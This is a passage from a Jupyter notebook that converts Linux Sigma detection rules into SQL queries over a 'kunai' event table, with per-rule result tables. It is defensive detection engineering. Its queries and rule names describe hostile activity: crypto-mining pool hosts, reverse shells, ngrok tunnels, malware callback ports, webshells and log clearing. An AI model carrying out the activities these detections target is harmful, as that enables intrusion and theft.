              "      <th></th>\n",
              "      <th>rule</th>\n",
              "      <th>empty</th>\n",
              "      <th>errors</th>\n",
              "      <th>hits</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>net_connection_lnx_crypto_mining_indicators.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>net_connection_lnx_back_connect_shell_dev.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>net_connection_lnx_domain_localtonet_tunnel.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>net_connection_lnx_susp_malware_callback_port.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>net_connection_lnx_ngrok_tunnel.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                                                rule  empty  errors  hits\n",
              "0    net_connection_lnx_crypto_mining_indicators.yml   True   False     0\n",
              "1      net_connection_lnx_back_connect_shell_dev.yml   True   False     0\n",
              "2    net_connection_lnx_domain_localtonet_tunnel.yml   True   False     0\n",
              "3  net_connection_lnx_susp_malware_callback_port.yml   True   False     0\n",
              "4                net_connection_lnx_ngrok_tunnel.yml   True   False     0"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "df_res1"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 32,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:41:36.802430Z",
          "iopub.status.busy": "2025-07-06T20:41:36.802268Z",
          "iopub.status.idle": "2025-07-06T20:42:10.735196Z",
          "shell.execute_reply": "2025-07-06T20:42:10.734726Z",
          "shell.execute_reply.started": "2025-07-06T20:41:36.802415Z"
        }
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "=> Processing rule file net_connection_lnx_crypto_mining_indicators.yml:\n"
          ]
        },
        {
          "name": "stderr",
          "output_type": "stream",
          "text": [
            "Parsing Sigma rules\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "```SELECT * FROM \"kunai\" WHERE data_dst_hostname='pool.minexmr.com' OR data_dst_hostname='fr.minexmr.com' OR data_dst_hostname='de.minexmr.com' OR data_dst_hostname='sg.minexmr.com' OR data_dst_hostname='ca.minexmr.com' OR data_dst_hostname='us-west.minexmr.com' OR data_dst_hostname='pool.supportxmr.com' OR data_dst_hostname='mine.c3pool.com' OR data_dst_hostname='xmr-eu1.nanopool.org' OR data_dst_hostname='xmr-eu2.nanopool.org' OR data_dst_hostname='xmr-us-east1.nanopool.org' OR data_dst_hostname='xmr-us-west1.nanopool.org' OR data_dst_hostname='xmr-asia1.nanopool.org' OR data_dst_hostname='xmr-jp1.nanopool.org' OR data_dst_hostname='xmr-au1.nanopool.org' OR data_dst_hostname='xmr.2miners.com' OR data_dst_hostname='xmr.hashcity.org' OR data_dst_hostname='xmr.f2pool.com' OR data_dst_hostname='xmrpool.eu' OR data_dst_hostname='pool.hashvault.pro' OR data_dst_hostname='moneroocean.stream' OR data_dst_hostname='monerocean.stream'\n",
            "```\n",
            "=> Processing rule file net_connection_lnx_back_connect_shell_dev.yml:\n"
          ]
        },
        {
          "name": "stderr",
          "output_type": "stream",
          "text": [
            "Parsing Sigma rules\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "```SELECT * FROM \"kunai\" WHERE data_exe_path LIKE '%/bin/bash' AND (NOT (data_dst_ip='127.0.0.1' OR data_dst_ip='0.0.0.0'))\n",
            "```\n",
            "=> Processing rule file net_connection_lnx_domain_localtonet_tunnel.yml:\n"
          ]
        },
        {
          "name": "stderr",
          "output_type": "stream",
          "text": [
            "Parsing Sigma rules\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "```SELECT * FROM \"kunai\" WHERE (data_dst_hostname LIKE '%.localto.net' OR data_dst_hostname LIKE '%.localtonet.com') AND Initiated='true'\n",
            "```\n",
            "=> Processing rule file net_connection_lnx_susp_malware_callback_port.yml:\n"
          ]
        },
        {
          "name": "stderr",
          "output_type": "stream",
          "text": [
            "Parsing Sigma rules\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "```SELECT * FROM \"kunai\" WHERE (Initiated='true' AND (data_dst_port=888 OR data_dst_port=999 OR data_dst_port=2200 OR data_dst_port=2222 OR data_dst_port=4000 OR data_dst_port=4444 OR data_dst_port=6789 OR data_dst_port=8531 OR data_dst_port=50501 OR data_dst_port=51820)) AND (NOT (data_dst_ip LIKE '127.%' OR data_dst_ip LIKE '10.%' OR data_dst_ip LIKE '172.16.%' OR data_dst_ip LIKE '172.17.%' OR data_dst_ip LIKE '172.18.%' OR data_dst_ip LIKE '172.19.%' OR data_dst_ip LIKE '172.20.%' OR data_dst_ip LIKE '172.21.%' OR data_dst_ip LIKE '172.22.%' OR data_dst_ip LIKE '172.23.%' OR data_dst_ip LIKE '172.24.%' OR data_dst_ip LIKE '172.25.%' OR data_dst_ip LIKE '172.26.%' OR data_dst_ip LIKE '172.27.%' OR data_dst_ip LIKE '172.28.%' OR data_dst_ip LIKE '172.29.%' OR data_dst_ip LIKE '172.30.%' OR data_dst_ip LIKE '172.31.%' OR data_dst_ip LIKE '192.168.%' OR data_dst_ip LIKE '169.254.%' OR data_dst_ip='::1/128' OR data_dst_ip LIKE 'fe8%' OR data_dst_ip LIKE 'fe9%' OR data_dst_ip LIKE 'fea%' OR data_dst_ip LIKE 'feb%' OR data_dst_ip LIKE 'fc%' OR data_dst_ip LIKE 'fd%'))\n",
            "```\n",
            "=> Processing rule file net_connection_lnx_ngrok_tunnel.yml:\n"
          ]
        },
        {
          "name": "stderr",
          "output_type": "stream",
          "text": [
            "Parsing Sigma rules\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "```SELECT * FROM \"kunai\" WHERE data_dst_hostname LIKE '%tunnel.us.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.eu.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.ap.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.au.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.sa.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.jp.ngrok.com%' OR data_dst_hostname LIKE '%tunnel.in.ngrok.com%'\n",
            "```\n"
          ]
        }
      ],
      "source": [
        "(df_res1b, df_stats1b) = convert_rulesdir_cli(\n",
        "    openobserve_prov, rulesdir, pipeline_f, table_name, stats=True\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 33,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:42:10.735859Z",
          "iopub.status.busy": "2025-07-06T20:42:10.735666Z",
          "iopub.status.idle": "2025-07-06T20:42:10.742432Z",
          "shell.execute_reply": "2025-07-06T20:42:10.742062Z",
          "shell.execute_reply.started": "2025-07-06T20:42:10.735844Z"
        }
      },
      "outputs": [
        {
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>rule</th>\n",
              "      <th>empty</th>\n",
              "      <th>errors</th>\n",
              "      <th>hits</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>net_connection_lnx_crypto_mining_indicators.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>net_connection_lnx_back_connect_shell_dev.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>net_connection_lnx_domain_localtonet_tunnel.yml</td>\n",
              "      <td>False</td>\n",
              "      <td>True</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>net_connection_lnx_susp_malware_callback_port.yml</td>\n",
              "      <td>False</td>\n",
              "      <td>True</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>net_connection_lnx_ngrok_tunnel.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                                                rule  empty  errors  hits\n",
              "0    net_connection_lnx_crypto_mining_indicators.yml   True   False     0\n",
              "1      net_connection_lnx_back_connect_shell_dev.yml   True   False     0\n",
              "2    net_connection_lnx_domain_localtonet_tunnel.yml  False    True     0\n",
              "3  net_connection_lnx_susp_malware_callback_port.yml  False    True     0\n",
              "4                net_connection_lnx_ngrok_tunnel.yml   True   False     0"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "df_res1b"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "code",
      "execution_count": 34,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:42:10.743705Z",
          "iopub.status.busy": "2025-07-06T20:42:10.742946Z",
          "iopub.status.idle": "2025-07-06T20:42:10.761719Z",
          "shell.execute_reply": "2025-07-06T20:42:10.759731Z",
          "shell.execute_reply.started": "2025-07-06T20:42:10.743686Z"
        }
      },
      "outputs": [],
      "source": [
        "rulesdir = base_rulesdir + \"/file_event\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 35,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:42:10.762759Z",
          "iopub.status.busy": "2025-07-06T20:42:10.762232Z",
          "iopub.status.idle": "2025-07-06T20:43:25.534022Z",
          "shell.execute_reply": "2025-07-06T20:43:25.533565Z",
          "shell.execute_reply.started": "2025-07-06T20:42:10.762737Z"
        }
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "=> Processing rule file file_event_lnx_susp_shell_script_under_profile_directory.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/file_event/file_event_lnx_susp_shell_script_under_profile_directory.yml\n",
            "=> Processing rule file file_event_lnx_wget_download_file_in_tmp_dir.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/file_event/file_event_lnx_wget_download_file_in_tmp_dir.yml\n",
            "=> Processing rule file file_event_lnx_triple_cross_rootkit_persistence.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/file_event/file_event_lnx_triple_cross_rootkit_persistence.yml\n",
            "=> Processing rule file file_event_lnx_persistence_sudoers_files.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/file_event/file_event_lnx_persistence_sudoers_files.yml\n",
            "=> Processing rule file file_event_lnx_doas_conf_creation.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/file_event/file_event_lnx_doas_conf_creation.yml\n",
            "=> Processing rule file file_event_lnx_triple_cross_rootkit_lock_file.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/file_event/file_event_lnx_triple_cross_rootkit_lock_file.yml\n",
            "=> Processing rule file file_event_lnx_persistence_cron_files.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/file_event/file_event_lnx_persistence_cron_files.yml\n"
          ]
        }
      ],
      "source": [
        "(df_res3, df_stats3) = convert_rulesdir(\n",
        "    openobserve_prov, rulesdir, table_name, openobserve_backend, stats=True\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 36,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:43:25.534814Z",
          "iopub.status.busy": "2025-07-06T20:43:25.534505Z",
          "iopub.status.idle": "2025-07-06T20:43:25.540676Z",
          "shell.execute_reply": "2025-07-06T20:43:25.540216Z",
          "shell.execute_reply.started": "2025-07-06T20:43:25.534797Z"
        }
      },
      "outputs": [
        {
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>rule</th>\n",
              "      <th>empty</th>\n",
              "      <th>errors</th>\n",
              "      <th>hits</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>file_event_lnx_susp_shell_script_under_profile...</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>file_event_lnx_wget_download_file_in_tmp_dir.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>file_event_lnx_triple_cross_rootkit_persistenc...</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>file_event_lnx_persistence_sudoers_files.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>file_event_lnx_doas_conf_creation.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>file_event_lnx_triple_cross_rootkit_lock_file.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>6</th>\n",
              "      <td>file_event_lnx_persistence_cron_files.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                                                rule  empty  errors  hits\n",
              "0  file_event_lnx_susp_shell_script_under_profile...   True   False     0\n",
              "1   file_event_lnx_wget_download_file_in_tmp_dir.yml   True   False     0\n",
              "2  file_event_lnx_triple_cross_rootkit_persistenc...   True   False     0\n",
              "3       file_event_lnx_persistence_sudoers_files.yml   True   False     0\n",
              "4              file_event_lnx_doas_conf_creation.yml   True   False     0\n",
              "5  file_event_lnx_triple_cross_rootkit_lock_file.yml   True   False     0\n",
              "6          file_event_lnx_persistence_cron_files.yml   True   False     0"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "df_res3"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 37,
      "metadata": {},
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:43:25.541458Z",
          "iopub.status.busy": "2025-07-06T20:43:25.541088Z",
          "iopub.status.idle": "2025-07-06T20:43:25.561127Z",
          "shell.execute_reply": "2025-07-06T20:43:25.560245Z",
          "shell.execute_reply.started": "2025-07-06T20:43:25.541440Z"
        }
      },
      "outputs": [],
      "source": [
        "rulesdir = base_rulesdir + \"/process_creation\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 38,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:43:25.562656Z",
          "iopub.status.busy": "2025-07-06T20:43:25.562442Z",
          "iopub.status.idle": "2025-07-06T21:04:39.436879Z",
          "shell.execute_reply": "2025-07-06T21:04:39.436329Z",
          "shell.execute_reply.started": "2025-07-06T20:43:25.562638Z"
        },
        "scrolled": true
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "=> Processing rule file proc_creation_lnx_malware_gobrat_grep_payload_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_malware_gobrat_grep_payload_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_touch_susp.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_touch_susp.yml\n",
            "=> Processing rule file proc_creation_lnx_file_and_directory_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_file_and_directory_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_ssm_agent_abuse.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_ssm_agent_abuse.yml\n",
            "=> Processing rule file proc_creation_lnx_base64_shebang_cli.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml\n",
            "=> Processing rule file proc_creation_lnx_sudo_cve_2019_14287.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_sudo_cve_2019_14287.yml\n",
            "=> Processing rule file proc_creation_lnx_services_stop_and_disable.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_services_stop_and_disable.yml\n",
            "=> Processing rule file proc_creation_lnx_disable_ufw.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_disable_ufw.yml\n",
            "=> Processing rule file proc_creation_lnx_nice_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_nice_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_chmod_directories.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_chmod_directories.yml\n",
            "=> Processing rule file proc_creation_lnx_capa_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_capa_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_install_root_certificate.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_install_root_certificate.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_execution_tmp_folder.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_execution_tmp_folder.yml\n",
            "=> Processing rule file proc_creation_lnx_schedule_task_job_cron.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_schedule_task_job_cron.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_history_recon.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_history_recon.yml\n",
            "=> Processing rule file proc_creation_lnx_remote_access_tools_teamviewer_incoming_connection.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_remote_access_tools_teamviewer_incoming_connection.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_history_delete.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_history_delete.yml\n",
            "=> Processing rule file proc_creation_lnx_curl_usage.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_curl_usage.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_hktl_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_hktl_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_wget_download_suspicious_directory.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_wget_download_suspicious_directory.yml\n",
            "=> Processing rule file proc_creation_lnx_usermod_susp_group.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_usermod_susp_group.yml\n",
            "=> Processing rule file proc_creation_lnx_netcat_reverse_shell.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_netcat_reverse_shell.yml\n",
            "=> Processing rule file proc_creation_lnx_dd_process_injection.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_dd_process_injection.yml\n",
            "=> Processing rule file proc_creation_lnx_proxy_connection.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_proxy_connection.yml\n",
            "=> Processing rule file proc_creation_lnx_webshell_detection.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml\n",
            "=> Processing rule file proc_creation_lnx_capsh_shell_invocation.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_capsh_shell_invocation.yml\n",
            "=> Processing rule file proc_creation_lnx_xterm_reverse_shell.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_xterm_reverse_shell.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_process_reading_sudoers.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_process_reading_sudoers.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_syslog_config_change.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_syslog_config_change.yml\n",
            "=> Processing rule file proc_creation_lnx_gcc_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_gcc_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_ruby_reverse_shell.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_ruby_reverse_shell.yml\n",
            "=> Processing rule file proc_creation_lnx_clear_logs.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_clear_logs.yml\n",
            "=> Processing rule file proc_creation_lnx_python_pty_spawn.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_python_pty_spawn.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_storage_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_storage_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_install_suspicioua_packages.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_install_suspicioua_packages.yml\n",
            "=> Processing rule file proc_creation_lnx_userdel.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_userdel.yml\n",
            "=> Processing rule file proc_creation_lnx_rsync_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_rsync_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_inod_listing.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_inod_listing.yml\n",
            "=> Processing rule file proc_creation_lnx_python_shell_os_system.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_python_shell_os_system.yml\n",
            "=> Processing rule file proc_creation_lnx_find_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_find_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_pnscan_binary_cli_pattern.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_pnscan_binary_cli_pattern.yml\n",
            "Exception on rule: SELECT * FROM kunai WHERE (os_type='linux' AND (info_event_name='execve' OR info_event_name LIKE 'execve_script')) AND ((info_event_name='execve' OR info_event_name LIKE 'execve_script') AND regexp_like(data_command_line, '-(W|R)\\s?(\\s|\"|')([0-9a-fA-F]{2}\\s?){2,20}(\\s|\"|')', 'i')) as Error tokenizing '?(\\s|\"|')([0-9a-fA-F]{2}\\s?){2,20}(\\s|\"|')', 'i')'\n",
            "=> Processing rule file proc_creation_lnx_dd_file_overwrite.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_dd_file_overwrite.yml\n",
            "=> Processing rule file proc_creation_lnx_crypto_mining.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_crypto_mining.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_user_account_creation.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_user_account_creation.yml\n",
            "=> Processing rule file proc_creation_lnx_clear_syslog.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_clear_syslog.yml\n",
            "=> Processing rule file proc_creation_lnx_bash_interactive_shell.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_bash_interactive_shell.yml\n",
            "=> Processing rule file proc_creation_lnx_vim_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_vim_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_file_deletion.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_file_deletion.yml\n",
            "=> Processing rule file proc_creation_lnx_at_command.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_at_command.yml\n",
            "=> Processing rule file proc_creation_lnx_groupdel.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_groupdel.yml\n",
            "=> Processing rule file proc_creation_lnx_nohup.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_nohup.yml\n",
            "=> Processing rule file proc_creation_lnx_grep_os_arch_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_grep_os_arch_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_flock_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_flock_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_network_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_network_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_curl_fileupload.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_curl_fileupload.yml\n",
            "=> Processing rule file proc_creation_lnx_bpftrace_unsafe_option_usage.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_bpftrace_unsafe_option_usage.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_dockerenv_recon.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_dockerenv_recon.yml\n",
            "=> Processing rule file proc_creation_lnx_system_info_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_system_info_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_security_software_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_security_software_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_mkfifo_named_pipe_creation.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_mkfifo_named_pipe_creation.yml\n",
            "=> Processing rule file proc_creation_lnx_python_reverse_shell.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_python_reverse_shell.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_container_residence_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_container_residence_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_base64_execution.yml:\n",
